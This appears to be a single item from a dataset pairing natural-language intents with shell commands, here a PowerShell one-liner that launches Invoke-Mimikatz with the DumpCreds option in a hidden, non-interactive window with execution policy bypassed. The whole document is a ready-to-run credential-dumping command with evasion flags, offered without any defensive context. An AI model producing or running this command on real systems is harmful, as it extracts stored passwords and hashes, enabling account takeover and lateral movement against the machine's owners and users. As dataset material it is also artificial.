# Natural language intent:
# Execute Mimikatz to dump credentials with specific PowerShell settings.

powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Mimikatz -DumpCreds"
